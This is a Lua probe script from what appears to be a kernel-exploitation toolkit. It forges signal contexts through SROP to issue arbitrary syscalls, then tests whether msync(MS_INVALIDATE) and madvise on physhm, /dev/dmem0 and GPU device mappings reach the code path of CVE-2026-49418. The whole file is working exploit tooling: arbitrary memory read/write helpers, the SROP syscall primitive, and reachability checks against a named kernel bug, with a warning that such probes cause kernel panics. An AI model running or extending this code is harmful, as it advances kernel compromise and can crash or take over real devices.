-- CRASH_CLASS: MODERATE
-- PROBE 180a: msync + madvise on physhm and other device mappings
--
-- 58a: msync(MS_INVALIDATE) returns -1 on GPU mmap (managed pager).
-- CVE-2026-49418 targets UNMANAGED device pager objects.
-- physhm mmap is a candidate for unmanaged pager.
-- Also tests madvise(MADV_DONTNEED/FREE) which can trigger similar paths.
--
-- WARNING: physhm probes previously caused kernel panics.

print("=== 180a: MSYNC/MADVISE ON DEVICE MAPPINGS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sca = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sca)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

print("srop_ok")

-- Section A: msync on physhm
print("")
print("--- A: PHYSHM MSYNC ---")
local rv = srop(629, uint64(1), uint64(2), uint64(0), uint64(0))
local fd = rv and to_num(rv) or -1
print("physhm_fd=" .. fd)

if fd >= 0 then
    rv = srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(fd), uint64(0))
    local mh, ml = 0, 0
    if rv then mh, ml = get_hi_lo(rv) end
    print("physhm_va=" .. hex64(rv))
    local va = uint64(string.format("0x%X%08X", mh, ml))

    if mh ~= 0 or ml ~= 0 then
        -- msync MS_SYNC (safe)
        rv = srop(65, va, uint64(0x4000), uint64(0))
        print("msync(MS_SYNC)=" .. (rv and to_num(rv) or -999))

        -- msync MS_ASYNC
        rv = srop(65, va, uint64(0x4000), uint64(1))
        print("msync(MS_ASYNC)=" .. (rv and to_num(rv) or -999))

        -- msync MS_INVALIDATE (CVE path)
        rv = srop(65, va, uint64(0x4000), uint64(2))
        local inv = rv and to_num(rv) or -999
        print("msync(MS_INVALIDATE)=" .. inv)

        if inv == 0 then
            print("!!! MS_INVALIDATE SUCCEEDED ON PHYSHM !!!")
            print("!!! CVE-2026-49418 DEVICE PAGER PATH REACHABLE !!!")
        end

        -- madvise tests
        -- MADV_DONTNEED=4, MADV_FREE=5
        rv = srop(75, va, uint64(0x4000), uint64(4))
        print("madvise(DONTNEED)=" .. (rv and to_num(rv) or -999))

        rv = srop(75, va, uint64(0x4000), uint64(5))
        print("madvise(FREE)=" .. (rv and to_num(rv) or -999))

        -- mincore to check page residency
        local sc_mmap = make_syscall(477)
        local _, gpu = pcall(function()
            return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
                uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
        end)
        local gh, gl = get_hi_lo(gpu)
        local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

        wd(gpu, 0)
        rv = srop(78, va, uint64(0x4000), ga(0))
        print("mincore=" .. (rv and to_num(rv) or -999) .. " vec=" .. rd(gpu))

        srop(73, va, uint64(0x4000))  -- munmap
    end
    srop(6, uint64(fd))
end

-- Section B: msync on dmem0 mapping
print("")
print("--- B: DMEM0 MSYNC ---")
-- Open with O_RDWR
local PATH = memory.alloc(32)
local dev_str = "/dev/dmem0"
for i = 0, #dev_str do
    local b = (i < #dev_str) and string.byte(dev_str, i+1) or 0
    pcall(function() memory.write_byte(PATH + i, b) end)
end
-- Use srop for open
rv = srop(5, uint64(PATH), uint64(2))  -- O_RDWR
local dfd = rv and to_num(rv) or -1
print("dmem0_fd=" .. dfd)

if dfd >= 0 then
    rv = srop(477, uint64(0), uint64(0x4000), uint64(1),
        uint64(1), uint64(dfd), uint64(0))
    local dh, dl = 0, 0
    if rv then dh, dl = get_hi_lo(rv) end
    print("dmem0_va=" .. hex64(rv))

    if dh ~= 0 or dl ~= 0 then
        local dva = uint64(string.format("0x%X%08X", dh, dl))

        rv = srop(65, dva, uint64(0x4000), uint64(2))
        local inv2 = rv and to_num(rv) or -999
        print("msync(MS_INVALIDATE)=" .. inv2)

        if inv2 == 0 then
            print("!!! MS_INVALIDATE SUCCEEDED ON DMEM0 !!!")
        end

        srop(73, dva, uint64(0x4000))
    end
    srop(6, uint64(dfd))
end

-- Section C: madvise on GPU mapping
print("")
print("--- C: MADVISE ON GPU ---")
local sc_mmap2 = make_syscall(477)
local _, gm = pcall(function()
    return sc_mmap2(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gmh, gml = get_hi_lo(gm)
local gva = uint64(string.format("0x%X%08X", gmh, gml))
print("gpu_va=" .. hex64(gm))

-- Write pattern
pcall(function() memory.write_dword(gm, 0xDEADBEEF) end)

rv = srop(75, gva, uint64(0x4000), uint64(4))  -- MADV_DONTNEED
print("madvise(DONTNEED)=" .. (rv and to_num(rv) or -999))

-- Check if data survived
local ok_r, v_r = pcall(function() return memory.read_dword(gm) end)
if ok_r then
    print("post_madvise=" .. string.format("0x%X", to_num(v_r)))
    if to_num(v_r) ~= 0xDEADBEEF then print("DATA CHANGED!") end
end

rv = srop(75, gva, uint64(0x4000), uint64(5))  -- MADV_FREE
print("madvise(FREE)=" .. (rv and to_num(rv) or -999))

srop(73, gva, uint64(0x4000))

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
